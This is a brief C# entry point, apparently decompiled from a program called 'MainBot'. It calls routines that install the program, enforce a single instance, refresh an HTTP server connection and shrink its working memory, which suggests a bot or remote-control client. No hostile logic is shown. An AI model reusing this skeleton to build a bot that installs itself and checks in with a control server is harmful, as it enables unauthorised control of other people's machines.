namespace MainBot
{
    using System;

    internal static class MainClass
    {
        [STAThread]
        private static void Main(string[] args)
        {
            InstallAndMutex.Install(args);
            HTTPConnection.DoServerRefresh2();
            Util.SetProcessWorkingSizeM();
        }
    }
}

